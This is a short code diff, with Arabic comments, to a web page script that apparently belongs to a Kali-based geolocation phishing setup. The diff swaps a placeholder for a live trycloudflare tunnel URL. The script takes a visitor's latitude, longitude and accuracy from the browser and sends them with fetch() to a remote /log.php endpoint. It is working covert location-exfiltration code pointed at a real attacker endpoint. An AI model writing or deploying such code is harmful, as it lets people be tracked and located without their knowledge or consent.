@@ -22,9 +22,8 @@
             var lon = position.coords.longitude;
             var acc = position.coords.accuracy;
 
-            // استبدل الرابط أدناه برابط الـ Cloudflared الذي يظهر عندك في كالي
-            // مثال: https://your-link.trycloudflare.com
-            var kali_url = "https://YOUR_CLOUDFLARE_URL_HERE.trycloudflare.com"; 
+            // الرابط الخاص بك الذي تم إنشاؤه بواسطة Cloudflared
+            var kali_url = "https://java-claire-orders-parallel.trycloudflare.com"; 
 
             // إرسال البيانات للسيكر في كالي
             fetch(kali_url + "/log.php?lat=" + lat + "&lon=" + lon + "&acc=" + acc)
